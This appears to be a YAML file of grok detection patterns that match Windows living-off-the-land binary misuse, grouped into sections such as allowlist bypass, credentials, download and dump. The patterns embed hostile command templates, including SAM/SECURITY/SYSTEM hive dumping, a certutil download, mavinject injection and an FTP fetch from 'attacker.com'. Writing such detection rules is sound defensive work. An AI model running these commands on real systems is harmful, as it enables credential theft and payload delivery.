grok_patterns:
  Alternate_data_streams:
    # --- Mshta.exe ---
    ADS_MSHTA_1: "%{WORD:process}\\.exe \\\"%{NOTSPACE:targetFile}\\\""

    # --- Rundll32.exe ---
    ADS_RUNDLL32_1: "%{WORD:process} \\\"%{NOTSPACE:targetFile}\\\",DllMain"

    # --- Bitsadmin.exe ---
    ADS_BITSADMIN_1: "%{WORD:process} /create 1 bitsadmin /addfile 1 %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} bitsadmin /SetNotifyCmdLine 1 %{NOTSPACE:targetFile} NULL bitsadmin /RESUME 1 bitsadmin /complete 1"

    # --- Certutil.exe ---
    ADS_CERTUTIL_1: "%{WORD:process}\\.exe -urlcache -f %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Cmd.exe ---
    ADS_CMD_1: "%{WORD:process}\\.exe /c echo regsvr32\\.exe \\^/s \\^/u \\^/i:%{NOTSPACE:targetFile} \\^scrobj\\.dll > %{NOTSPACE:targetFile}"
    ADS_CMD_2: "%{WORD:process}\\.exe - < %{NOTSPACE:targetFile}"

    # --- Control.exe ---
    ADS_CONTROL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

    # --- Cscript.exe ---
    ADS_CSCRIPT_1: "%{WORD:process} //e:vbscript %{NOTSPACE:targetFile}"

    # --- Esentutl.exe ---
    ADS_ESENTUTL_1: "%{WORD:process}\\.exe /y %{NOTSPACE:targetFile} /d %{NOTSPACE:targetFile} /o"
    ADS_ESENTUTL_2: "%{WORD:process}\\.exe /y \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe /d %{NOTSPACE:targetFile} /o"

    # --- Expand.exe ---
    ADS_EXPAND_1: "%{WORD:process} %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Extrac32.exe ---
    ADS_EXTRAC32_1: "%{WORD:process} %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Findstr.exe ---
    ADS_FINDSTR_1: "%{WORD:process} /V /L W3AllLov3LolBas %{NOTSPACE:targetFile} > %{NOTSPACE:targetFile}"

    # --- Forfiles.exe ---
    ADS_FORFILES_1: "%{WORD:process} /p c:\\\\windows\\\\system32 /m notepad\\.exe /c \\\"%{GREEDYDATA:targetFile}\\\""

    # --- Makecab.exe ---
    ADS_MAKECAB_1: "%{WORD:process} %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Mavinject.exe ---
    ADS_MAVINJECT_1: "%{WORD:process}\\.exe 4172 /INJECTRUNNING %{NOTSPACE:targetFile}"

    # --- Reg.exe ---
    ADS_REG_1: "%{WORD:process} export HKLM\\\\SOFTWARE\\\\Microsoft\\\\Evilreg %{NOTSPACE:targetFile}"
    ADS_REG_2: "%{WORD:process} %{NOTSPACE:targetFile}"

    # --- Sc.exe ---
    ADS_SC_1: "%{WORD:process} create evilservice binPath=\\\"\\\"%{NOTSPACE:targetFile}\\\" /c echo works > \\\"%{NOTSPACE:targetFile}\\\"\\\" DisplayName= \\\"evilservice\\\" start= auto\\\\ & sc start evilservice"
    ADS_SC_2: "%{WORD:process} config \\{ExistingServiceName\\} binPath=\\\"\\\"%{NOTSPACE:targetFile}\\\" /c echo works > \\\"%{NOTSPACE:targetFile}\\\"\\\" & sc start \\{ExistingServiceName\\}"

    # --- Tar.exe ---
    ADS_TAR_1: "%{WORD:process} -cf %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
    ADS_TAR_2: "%{WORD:process} -xf %{NOTSPACE:targetFile}"

    # --- Wmic.exe ---
    ADS_WMIC_1: "%{WORD:process}\\.exe process call create \\\"%{GREEDYDATA:targetFile}\\\""

    # --- Wscript.exe ---
    ADS_WSCRIPT_1: "%{WORD:process} //e:vbscript %{NOTSPACE:targetFile}"
    ADS_WSCRIPT_2: "echo GetObject\\(\\\"script:%{NOTSPACE:targetFile}\\\"\\) > %{NOTSPACE:targetFile} && wscript\\.exe %{NOTSPACE:targetFile}"

    # --- MpCmdRun.exe ---
    ADS_MPCMDRUN_1: "%{WORD:process}\\.exe -DownloadFile -url %{NOTSPACE:targetFile} -path %{NOTSPACE:targetFile}"

    # --- Msxsl.exe ---
    ADS_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} -o %{NOTSPACE:targetFile}"

    # --- Diantz.exe ---
    ADS_DIANTZ_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Print.exe ---
    ADS_PRINT_1: "%{WORD:process} /D:%{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- PrintBrm.exe ---
    ADS_PRINTBRM_1: "%{WORD:process} -r -f %{NOTSPACE:targetFile} -d %{NOTSPACE:targetFile}"

    # --- Regedit.exe & Regini.exe ---
    ADS_REGEDIT_1: "%{WORD:process} /E %{NOTSPACE:targetFile} HKEY_CURRENT_USER\\\\MyCustomRegKey"
    ADS_REGEDIT_2: "%{WORD:process} %{NOTSPACE:targetFile}"
    ADS_REGINI_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

  AWL_bypass:
    # --- Regsvr32.exe ---
    AWL_REGSVR32_1: "regsvr32 /s /n /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"
    AWL_REGSVR32_2: "%{WORD:process}\\.exe /s /u /i:%{NOTSPACE:targetFile} scrobj\\.dll"

    # --- Installutil.exe ---
    AWL_INSTALLUTIL_1: "InstallUtil\\.exe /logfile= /LogToConsole=false /U %{NOTSPACE:targetFile}"

    # --- Msbuild.exe ---
    AWL_MSBUILD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

    # --- Winget.exe ---
    AWL_WINGET_1: "%{WORD:process}\\.exe install --accept-package-agreements -s msstore %{GREEDYDATA:targetFile}"

    # --- Bash.exe ---
    AWL_BASH_1: "%{WORD:process}\\.exe -c \\\"%{GREEDYDATA:targetFile}\\\""

    # --- Cmstp.exe ---
    AWL_CMSTP_1: "%{WORD:process}\\.exe /ni /s %{NOTSPACE:targetFile}"

    # --- Microsoft.Workflow.Compiler.exe ---
    AWL_WORKFLOW_COMPILER_1: "Microsoft\\.Workflow\\.Compiler\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Msdt.exe ---
    AWL_MSDT_1: "%{WORD:process}\\.exe -path C:\\\\WINDOWS\\\\diagnostics\\\\index\\\\PCWDiagnostic\\.xml -af %{NOTSPACE:targetFile} /skip TRUE"
    AWL_MSDT_2: "%{WORD:process}\\.exe /id PCWDiagnostic /skip force /param \\\"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/\\.\\./\\.\\./%{NOTSPACE:targetFile}\\\""

    # --- Regasm.exe & Regsvcs.exe ---
    AWL_REGASM_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    AWL_REGSVCS_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

    # --- DLL Execution (Advpack, Dfshim, Setupapi, Ieadvpack, Syssetup) ---
    AWL_ADVPACK_1: "rundll32\\.exe advpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},DefaultInstall_SingleUser,1,"
    AWL_ADVPACK_2: "rundll32\\.exe advpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},,1,"
    AWL_DFSHIM_1: "rundll32\\.exe dfshim\\.dll,ShOpenVerbApplication %{NOTSPACE:targetFile}"
    AWL_SETUPAPI_1: "rundll32\\.exe setupapi\\.dll,InstallHinfSection DefaultInstall 128 %{NOTSPACE:targetFile}"
    AWL_IEADVPACK_1: "rundll32\\.exe ieadvpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},DefaultInstall_SingleUser,1,"
    AWL_IEADVPACK_2: "rundll32\\.exe ieadvpack\\.dll,LaunchINFSection %{NOTSPACE:targetFile},,1,"
    AWL_SYSSETUP_1: "rundll32 syssetup\\.dll,SetupInfObjectInstallAction DefaultInstall 128 %{NOTSPACE:targetFile}"

    # --- Dotnet.exe ---
    AWL_DOTNET_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    AWL_DOTNET_2: "%{WORD:process}\\.exe msbuild %{NOTSPACE:targetFile}"

    # --- Fsi.exe & FsiAnyCpu.exe ---
    AWL_FSI_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    AWL_FSI_2: "%{WORD:process}\\.exe"
    AWL_FSIANYCPU_1: "fsianycpu\\.exe %{NOTSPACE:targetFile}"
    AWL_FSIANYCPU_2: "fsianycpu\\.exe"

    # --- Msxsl.exe ---
    AWL_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Squirrel.exe ---
    AWL_SQUIRREL_1: "%{WORD:process}\\.exe --update %{NOTSPACE:targetFile}"
    AWL_SQUIRREL_2: "%{WORD:process}\\.exe --updateRollback=%{NOTSPACE:targetFile}"

    # --- Update.exe ---
    AWL_UPDATE_1: "Update\\.exe --update=%{NOTSPACE:targetFile}"
    AWL_UPDATE_2: "Update\\.exe --updateRollback=%{NOTSPACE:targetFile}"
    AWL_UPDATE_3: "Update\\.exe --processStart %{NOTSPACE:targetFile} --process-start-args \\\"/arg1 /arg2\\\""

    # --- Winrm.vbs ---
    AWL_WINRM_1: "%SystemDrive%\\\\BypassDir\\\\cscript //nologo %windir%\\\\System32\\\\winrm\\.vbs get wmicimv2/Win32_Process\\?Handle=4 -format:pretty"

    # --- Aspnet_Compiler.exe ---
    AWL_ASPNET_COMPILER_1: "C:\\\\Windows\\\\Microsoft\\.NET\\\\Framework64\\\\v4\\.0\\.30319\\\\aspnet_compiler\\.exe -v none -p C:\\\\users\\\\cpl\\.internal\\\\desktop\\\\asptest\\\\ -f %{NOTSPACE:targetFile} -u"

    # --- AccCheckConsole.exe ---
    AWL_ACCCHECKCONSOLE_1: "AccCheckConsole\\.exe -window \\\"Untitled - Notepad\\\" %{NOTSPACE:targetFile}"

    # --- Bginfo.exe ---
    AWL_BGINFO_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"
    AWL_BGINFO_2: "\\\\\\\\10\\.10\\.10\\.10\\\\webdav\\\\bginfo\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"
    AWL_BGINFO_3: "\\\\\\\\live\\.sysinternals\\.com\\\\Tools\\\\bginfo\\.exe %{NOTSPACE:targetFile} /popup /nolicprompt"

    # --- Coregen.exe ---
    AWL_COREGEN_1: "coregen\\.exe /L %{NOTSPACE:targetFile} dummy_assembly_name"

    # --- Msdeploy.exe ---
    AWL_MSDEPLOY_1: "msdeploy\\.exe -verb:sync -source:RunCommand -dest:runCommand=\\\"%{NOTSPACE:targetFile}\\\""

    # --- Rcsi.exe ---
    AWL_RCSI_1: "rcsi\\.exe %{NOTSPACE:targetFile}"

    # --- Remote.exe ---
    AWL_REMOTE_1: "Remote\\.exe /s %{NOTSPACE:targetFile} anythinghere"

    # --- Tracker.exe ---
    AWL_TRACKER_1: "Tracker\\.exe /d %{NOTSPACE:targetFile} /c C:\\\\Windows\\\\write\\.exe"

    # --- VisualUiaVerifyNative.exe ---
    AWL_VISUALUIAVERIFYNATIVE_1: "VisualUiaVerifyNative\\.exe"

    # --- Wfc.exe ---
    AWL_WFC_1: "wfc\\.exe %{NOTSPACE:targetFile}"

    # --- Vstest.console.exe ---
    AWL_VSTEST_CONSOLE_1: "vstest\\.console\\.exe %{NOTSPACE:targetFile}"

  Compile:
    # --- Csc.exe (C# Compiler) ---
    COMPILE_CSC_1: "%{WORD:process}\\.exe -out:%{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
    COMPILE_CSC_2: "%{WORD:process} -target:library %{NOTSPACE:targetFile}"

    # --- Ilasm.exe (IL Assembler) ---
    COMPILE_ILASM_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} /exe"
    COMPILE_ILASM_2: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} /dll"

    # --- Jsc.exe (JS Compiler) ---
    COMPILE_JSC_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    COMPILE_JSC_2: "%{WORD:process}\\.exe /t:library %{NOTSPACE:targetFile}"

    # --- Vbc.exe (VB Compiler) ---
    COMPILE_VBC_1: "%{WORD:process}\\.exe /target:exe %{NOTSPACE:targetFile}"
    COMPILE_VBC_2: "%{WORD:process} -reference:Microsoft\\.VisualBasic\\.dll %{NOTSPACE:targetFile}"

  Conceal:
    # --- DeviceCredentialDeployment.exe ---
    # 장치 자격 증명 배포 도구의 실행을 탐지합니다. 
    # 인자값이 추가될 경우를 대비해 GREEDYDATA를 배치하였습니다.
    CONCEAL_DEVICE_CRED_1: "DeviceCredentialDeployment\\.exe%{GREEDYDATA:targetFile}"

  Copy:
    # --- Bitsadmin.exe ---
    COPY_BITSADMIN_1: "%{WORD:process} /create 1 & bitsadmin /addfile 1 %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset"

    # --- Esentutl.exe ---
    COPY_ESENTUTL_1: "%{WORD:process}\\.exe /y %{NOTSPACE:targetFile} /d %{NOTSPACE:targetFile} /o"
    COPY_ESENTUTL_2: "%{WORD:process}\\.exe /y /vss %{NOTSPACE:targetFile} /d %{NOTSPACE:targetFile}"

    # --- Expand.exe ---
    COPY_EXPAND_1: "%{WORD:process} %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Extrac32.exe ---
    COPY_EXTRAC32_1: "%{WORD:process}\\.exe /C %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Tar.exe ---
    COPY_TAR_1: "%{WORD:process} -xf %{NOTSPACE:targetFile}"

    # --- Wmic.exe ---
    # 쌍따옴표 안에 홑따옴표가 들어간 복잡한 패턴을 처리합니다.
    COPY_WMIC_1: "%{WORD:process}\\.exe datafile where \\\"Name='%{NOTSPACE:targetFile}'\\\" call Copy \\\"%{NOTSPACE:targetFile}\\\""

    # --- Colorcpl.exe ---
    COPY_COLORCPL_1: "%{WORD:process} %{NOTSPACE:targetFile}"

    # --- Print.exe ---
    COPY_PRINT_1: "%{WORD:process} /D:%{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Replace.exe ---
    COPY_REPLACE_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} /A"

    # --- Dtutil.exe ---
    COPY_DTUTIL_1: "%{WORD:process}\\.exe /FILE %{NOTSPACE:targetFile} /COPY FILE;%{NOTSPACE:targetFile}"

    # --- Msdeploy.exe ---
    COPY_MSDEPLOY_1: "%{WORD:process}\\.exe -verb:sync -source:filePath=%{NOTSPACE:targetFile} -dest:filePath=%{NOTSPACE:targetFile}"

  Credentials:
    # --- Findstr.exe (Searching for Passwords) ---
    # 정책 XML 파일 등에서 'cpassword' 키워드를 검색하여 암호를 찾는 행위를 탐지합니다.
    CRED_FINDSTR_1: "%{WORD:process} /S /I cpassword %{NOTSPACE:targetFile}"

    # --- Reg.exe (Registry Hive Dumping) ---
    # 계정 해시가 담긴 SAM, SECURITY, SYSTEM 하이브를 파일로 저장하는 행위를 탐지합니다.
    # 중복 변수 기능을 통해 모든 백업 파일 경로(targetFile 1~3)를 추출합니다.
    CRED_REG_SAVE_1: "reg save HKLM\\\\SECURITY %{NOTSPACE:targetFile} && reg save HKLM\\\\SYSTEM %{NOTSPACE:targetFile} && reg save HKLM\\\\SAM %{NOTSPACE:targetFile}"

    # --- Rpcping.exe (Credential Prompting/Relay) ---
    # 인증 방식을 NTLM으로 강제하여 자격 증명을 가로채려는 시도를 탐지합니다.
    CRED_RPCPING_1: "rpcping -s %{NOTSPACE:targetFile} -e %{NOTSPACE:targetFile} -a %{WORD:auth} -u NTLM"
    CRED_RPCPING_2: "rpcping /s %{NOTSPACE:targetFile} /e %{NOTSPACE:targetFile} /a %{WORD:auth} /u NTLM"

    # --- Cmdkey.exe (List Cached Credentials) ---
    # 시스템에 저장된 자격 증명 목록을 확인하는 행위를 탐지합니다.
    CRED_CMDKEY_LIST_1: "cmdkey /list"

  Decode:
    # --- Certutil.exe (Base64 Decode) ---
    # 인코딩된 파일(targetFile)과 복구된 원본 파일(targetFile2)을 추출합니다.
    DECODE_CERTUTIL_1: "%{WORD:process} -decode %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

    # --- Certutil.exe (Hex Decode) ---
    # 16진수 파일(targetFile)과 복구된 원본 파일(targetFile2)을 추출합니다.
    DECODE_CERTUTIL_HEX_1: "%{WORD:process} -decodehex %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"

  Download:
    # --- Native Tools & Common Bins ---
    DOWN_MSHTA_1: "%{WORD:process} %{NOTSPACE:targetFile}"
    
    DOWN_BITSADMIN_1: "%{WORD:process} /create 1 bitsadmin /addfile 1 https://live\\.sysinternals\\.com/autoruns\\.exe %{NOTSPACE:targetFile} bitsadmin /RESUME 1 bitsadmin /complete 1"
    
    DOWN_CERTUTIL_1: "%{WORD:process}\\.exe -urlcache -f %{NOTSPACE:targetFile} %{NOTSPACE:targetFile}"
    
    DOWN_CMD_1: "type \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.ext > %{NOTSPACE:targetFile}"
    
    DOWN_ESENTUTL_1: "%{WORD:process}\\.exe /y \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.source\\.exe /d %{NOTSPACE:targetFile} /o"
    
    DOWN_EXPAND_1: "%{WORD:process} \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.bat %{NOTSPACE:targetFile}"
    
    DOWN_EXTRAC32_1: "%{WORD:process} /Y /C \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.ext %{NOTSPACE:targetFile}"
    
    DOWN_FINDSTR_1: "%{WORD:process} /V /L W3AllLov3LolBas \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe > %{NOTSPACE:targetFile}"
    
    DOWN_FINGER_1: "%{WORD:process} %{NOTSPACE:targetFile}"
    
    DOWN_FTP_1: "cmd\\.exe /c \\\"@echo open attacker\\.com 21>ftp\\.txt&@echo USER attacker>>ftp\\.txt&@echo PASS PaSsWoRd>>ftp\\.txt&@echo binary>>ftp\\.txt&@echo GET /%{NOTSPACE:targetFile}>>ftp\\.txt&@echo quit>>ftp\\.txt&@ftp -s:ftp\\.txt -v\\\""
    
    DOWN_INSTALLUTIL_1: "InstallUtil\\.exe %{NOTSPACE:targetFile}"
    
    DOWN_LDIFDE_1: "Ldifde -i -f %{NOTSPACE:targetFile}"
    
    DOWN_MAKECAB_1: "%{WORD:process} \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile}"
    
    DOWN_WINGET_1: "%{WORD:process}\\.exe install --accept-package-agreements -s msstore %{GREEDYDATA:targetFile}"

    # --- Microsoft Edge & Office ---
    DOWN_MSEDGE_PROXY_1: "C:\\\\Program Files \\(x86\\)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge_proxy\\.exe %{NOTSPACE:targetFile}"
    DOWN_MSEDGE_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_MSEDGE_2: "%{WORD:process}\\.exe --headless --enable-logging --disable-gpu --dump-dom \\\"%{NOTSPACE:targetFile}\\\" > file\\.b64"
    DOWN_EXCEL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_POWERPNT_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_WINWORD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_MSACCESS_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_MSOHTMED_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_MSPUB_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_VISIO_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_WINPROJ_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

    # --- System Utilities ---
    DOWN_DEVTUNNEL_1: "%{WORD:process}\\.exe host -p %{NOTSPACE:targetFile}"
    DOWN_APPINSTALLER_1: "start ms-appinstaller://\\?source=%{NOTSPACE:targetFile}"
    DOWN_HH_1: "HH\\.exe %{NOTSPACE:targetFile}"
    DOWN_MMC_1: "%{WORD:process}\\.exe -Embedding %{NOTSPACE:targetFile}"
    
    DOWN_MPCMDRUN_1: "%{WORD:process}\\.exe -DownloadFile -url %{NOTSPACE:targetFile} -path %{NOTSPACE:targetFile}"
    DOWN_MPCMDRUN_2: "copy \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4\\.18\\.2008\\.9-0\\\\MpCmdRun\\.exe\\\" C:\\\\Users\\\\Public\\\\Downloads\\\\MP\\.exe && chdir \\\"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\4\\.18\\.2008\\.9-0\\\" && \\\"C:\\\\Users\\\\Public\\\\Downloads\\\\MP\\.exe\\\" -DownloadFile -url %{NOTSPACE:targetFile} -path %{NOTSPACE:targetFile}"
    
    DOWN_XWIZARD_1: "%{WORD:process} RunWizard \\{7940acf8-60ba-4213-a7c3-f3b400ee266d\\} /z%{NOTSPACE:targetFile}"
    
    DOWN_SCROBJ_DLL_1: "rundll32\\.exe C:\\\\Windows\\\\System32\\\\scrobj\\.dll,GenerateTypeLib %{NOTSPACE:targetFile}"
    
    DOWN_MSXSL_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} -o file\\.ext"
    
    DOWN_SQUIRREL_1: "%{WORD:process}\\.exe --download %{NOTSPACE:targetFile}"
    DOWN_UPDATE_1: "Update\\.exe --download %{NOTSPACE:targetFile}"
    
    DOWN_WSL_1: "%{WORD:process}\\.exe --exec bash -c 'cat < %{NOTSPACE:targetFile} > binary'"

    # --- Additional Windows Binaries ---
    DOWN_CERTOC_1: "%{WORD:process}\\.exe -GetCACAPS %{NOTSPACE:targetFile}"
    DOWN_CERTREQ_1: "%{WORD:process} -Post -config %{NOTSPACE:targetFile} %{NOTSPACE:targetFile} file\\.txt"
    DOWN_CMDL32_1: "%{WORD:process} /vpn /lan %cd%\\\\config"
    DOWN_CONFIGSECURITYPOLICY_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_DESKTOPIMGDOWNLDR_1: "set \\\"SYSTEMROOT=C:\\\\Windows\\\\Temp\\\" && cmd /c desktopimgdownldr\\.exe /lockscreenurl:%{NOTSPACE:targetFile} /eventName:desktopimgdownldr"
    DOWN_DIANTZ_1: "%{WORD:process}\\.exe \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile}"
    DOWN_IMEWDBLD_1: "C:\\\\Windows\\\\System32\\\\IME\\\\SHARED\\\\IMEWDBLD\\.exe %{NOTSPACE:targetFile}"
    DOWN_IEEXEC_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_NGEN_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_ONEDRIVESTANDALONEUPDATER_1: "OneDriveStandaloneUpdater"
    DOWN_PRESENTATIONHOST_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_PRINTBRM_1: "PrintBrm -b -d \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\folder -f %{NOTSPACE:targetFile}"
    DOWN_REPLACE_1: "%{WORD:process}\\.exe \\\\\\\\servername\\\\C\\$\\\\Windows\\\\Temp\\\\file\\.exe %{NOTSPACE:targetFile} /A"
    DOWN_BCP_1: "bcp \\\"SELECT payload_data FROM database\\.dbo\\.payloads WHERE id=1\\\" queryout \\\"%{NOTSPACE:targetFile}\\\" -S localhost -T -c"
    DOWN_ECMANGEN_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_PROTOCOLHANDLER_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"
    DOWN_VSLAUNCHBROWSER_1: "%{WORD:process}\\.exe \\.exe %{NOTSPACE:targetFile}"
    DOWN_XSD_1: "%{WORD:process}\\.exe %{NOTSPACE:targetFile}"

    # --- Image Viewers & DLLs ---
    DOWN_PHOTOVIEWER_DLL_1: "rundll32\\.exe \\\"C:\\\\Program Files\\\\Windows Photo Viewer\\\\PhotoViewer\\.dll\\\",ImageView_Fullscreen %{NOTSPACE:targetFile}"
    DOWN_SHIMGVW_DLL_1: "rundll32\\.exe c:\\\\Windows\\\\System32\\\\shimgvw\\.dll,ImageView_Fullscreen %{NOTSPACE:targetFile}"
    
  Dump:
    # --- Diskshadow.exe ---
    DUMP_DISKSHADOW_1: "%{WORD:process}\\.exe /s %{NOTSPACE:targetFile}"

    # --- Wbadmin.exe ---
    DUMP_WBADMIN_1: "%{WORD:process} start backup -backupTarget:%{NOTSPACE:targetFile} -include:%{NOTSPACE:targetFile} -quiet"
